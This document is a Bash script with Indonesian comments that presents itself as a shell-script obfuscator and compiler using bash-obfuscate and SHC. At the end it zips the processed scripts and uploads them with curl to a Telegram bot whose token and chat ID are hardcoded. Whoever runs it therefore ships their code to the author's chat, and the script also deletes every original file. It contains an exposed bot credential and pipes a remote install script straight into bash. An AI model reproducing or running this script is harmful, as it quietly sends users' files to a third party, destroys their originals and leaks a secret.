#!/bin/bash
set -e

# Warna
green="\e[32m"; red="\e[31m"; yellow="\e[33m"; reset="\e[0m"

# Telegram
BOT_TOKEN="8049229960:AAEMdgvMLGBk3jBEwArvp7iGT3EHiMY0JFs"
CHAT_ID="8118068872"
TG_API="https://api.telegram.org/bot$BOT_TOKEN/sendDocument"

# Install dependencies dasar
echo -e "${green}[+] Install curl, git, build-essential, dos2unix, zip, split, gcc, make...${reset}"
sudo apt update -y
sudo apt install -y curl git build-essential dos2unix zip coreutils gcc make

# Pilih metode
echo -e "${yellow}Pilih metode obfuscate/compile:${reset}"
echo "1) bash-obfuscate"
echo "2) SHC + GNU compile (portable)"
echo "3) Combine (bash-obfuscate + SHC)"
read -p "Masukkan pilihan (1/2/3): " method
if [[ "$method" != "1" && "$method" != "2" && "$method" != "3" ]]; then
    echo -e "${red}❌ Pilihan tidak valid${reset}"
    exit 1
fi

# Input folder
read -p "Masukkan path folder yang berisi file script: " folder_path
if [[ ! -d "$folder_path" ]]; then
  echo -e "${red}❌ Folder tidak ditemukan${reset}"
  exit 1
fi

OUTDIR="$folder_path/obfuscated"
mkdir -p "$OUTDIR"

echo -e "${green}[+] Memproses semua script di $folder_path...${reset}"

# Install bash-obfuscate jika dipilih (1 atau 3)
if [[ "$method" == "1" || "$method" == "3" ]]; then
    if ! command -v bash-obfuscate >/dev/null 2>&1; then
        echo -e "${green}[+] Menginstal NVM & Node.js untuk bash-obfuscate...${reset}"
        curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash
        export NVM_DIR="$HOME/.nvm"
        [ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"
        nvm install node
        nvm use node
        npm install -g bash-obfuscate
    fi
fi

# Install SHC jika dipilih (2 atau 3)
if [[ "$method" == "2" || "$method" == "3" ]]; then
    if ! command -v shc >/dev/null 2>&1; then
        echo -e "${yellow}[~] Menginstal SHC...${reset}"
        git clone https://github.com/neurobin/shc.git && cd shc
        make && sudo cp shc /usr/local/bin/
        cd .. && rm -rf shc
    fi
fi

# Loop file untuk obfuscate/compile
for script in "$folder_path"/*; do
    [[ -f "$script" ]] || continue
    mime=$(file -b --mime-type "$script")
    if [[ "$mime" == "text/x-shellscript" || "$mime" == "text/plain" ]]; then
        filename=$(basename "$script")
        temp_file="$OUTDIR/tmp_$filename"
        final_file="$OUTDIR/$filename"

        if [[ "$method" == "1" ]]; then
            echo -e "${yellow}[*] Obfuscate bash: $filename${reset}"
            bash-obfuscate "$script" -o "$final_file"
            sed -i '1i #!/bin/bash' "$final_file"
            dos2unix "$final_file" >/dev/null 2>&1
            chmod +x "$final_file"

        elif [[ "$method" == "2" ]]; then
            echo -e "${yellow}[*] Compile SHC (portable): $filename${reset}"
            dos2unix "$script" 2>/dev/null
            shc -r -f "$script" -o "$OUTDIR/${filename}.tmp" >/dev/null 2>&1 || true

            if [[ -f "$script.x.c" ]]; then
                gcc -static -O2 -o "$final_file" "$script.x.c" 2>/dev/null || gcc -O2 -o "$final_file" "$script.x.c"
                strip "$final_file" 2>/dev/null || true
                rm -f "$script.x.c" "$OUTDIR/${filename}.tmp"
            else
                mv "$OUTDIR/${filename}.tmp" "$final_file"
            fi

        elif [[ "$method" == "3" ]]; then
            echo -e "${yellow}[*] Obfuscate bash: $filename${reset}"
            bash-obfuscate "$script" -o "$temp_file"
            sed -i '1i #!/bin/bash' "$temp_file"
            dos2unix "$temp_file" >/dev/null 2>&1
            chmod +x "$temp_file"

            echo -e "${yellow}[*] Compile SHC (portable) setelah obfuscate: $filename${reset}"
            shc -r -f "$temp_file" -o "$OUTDIR/${filename}.tmp" >/dev/null 2>&1 || true

            if [[ -f "$temp_file.x.c" ]]; then
                gcc -static -O2 -o "$final_file" "$temp_file.x.c" 2>/dev/null || gcc -O2 -o "$final_file" "$temp_file.x.c"
                strip "$final_file" 2>/dev/null || true
                rm -f "$temp_file.x.c" "$OUTDIR/${filename}.tmp"
            else
                mv "$OUTDIR/${filename}.tmp" "$final_file"
            fi

            rm -f "$temp_file"
        fi

        echo -e "${green}[✔] Selesai: $filename → $final_file${reset}"
        rm -f "$script"
        echo -e "${yellow}[~] File asli dihapus: $filename${reset}"
    else
        echo -e "${red}[×] Lewat: $script (bukan script bash)${reset}"
    fi
done

# ZIP semua hasil
ZIPFILE="$folder_path/obfuscated_$(date +%Y%m%d_%H%M%S).zip"
zip -j "$ZIPFILE" "$OUTDIR"/* >/dev/null 2>&1
echo -e "${green}[✔] Semua file dikompres ke: $ZIPFILE${reset}"

# Cek ukuran ZIP
MAX_SIZE=$((50*1024*1024)) # 50MB
ZIP_SIZE=$(stat -c%s "$ZIPFILE")

if [[ $ZIP_SIZE -le $MAX_SIZE ]]; then
    echo -e "${yellow}[~] Mengirim ZIP hasil ke Telegram...${reset}"
    curl -s -F chat_id="$CHAT_ID" -F document=@"$ZIPFILE" -F caption="Hasil Obfuscate/SHC ZIP ✅" "$TG_API" \
        && echo -e "${green}[✔️] ZIP terkirim ke Telegram!${reset}" \
        && rm -f "$ZIPFILE" \
        && echo -e "${yellow}[~] ZIP asli dihapus setelah terkirim${reset}" \
        || echo -e "${red}✘ Gagal kirim ZIP${reset}"
else
    echo -e "${yellow}[~] ZIP >50MB, membagi menjadi beberapa bagian...${reset}"
    split -b 50M "$ZIPFILE" "${ZIPFILE}_part_"
    for part in "${ZIPFILE}_part_"*; do
        curl -s -F chat_id="$CHAT_ID" -F document=@"$part" "$TG_API" \
            && echo -e "${green}[✔️] Terkirim: $(basename $part)${reset}" \
            || echo -e "${red}✘ Gagal kirim: $(basename $part)${reset}"
        rm -f "$part"
    done
    rm -f "$ZIPFILE"
    echo -e "${yellow}[~] ZIP asli dihapus setelah split dan kirim${reset}"
fi

echo -e "${green}✅ Semua selesai! Hasil ada di: $OUTDIR${reset}"